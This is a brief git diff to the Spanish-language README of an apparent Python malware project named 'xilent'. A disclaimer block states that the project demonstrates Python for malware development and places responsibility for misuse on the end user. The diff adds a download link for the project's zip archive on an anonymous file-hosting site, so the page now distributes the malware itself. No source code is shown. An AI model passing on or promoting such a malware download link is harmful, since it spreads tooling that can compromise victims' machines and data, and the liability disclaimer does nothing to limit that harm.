@@ -41,7 +41,7 @@ El proyecto es de uso **privado** y fue creado con el objetivo de desarrollar un
 > [!CAUTION]
 > Al utilizar este software, usted acepta los términos y condiciones establecidos. En consecuencia, cualquier uso indebido de este software será de exclusiva responsabilidad del usuario final, y no del autor. Este proyecto tiene como objetivo inicial demostrar las capacidades de Python como herramienta para el desarrollo de malware en entornos controlados. 
 
-⬇️ **Download:**
+⬇️ **Download:** https://anonymfile.com/RYyxK/xilent.zip
 
 <h1 align="center"></h1>
 
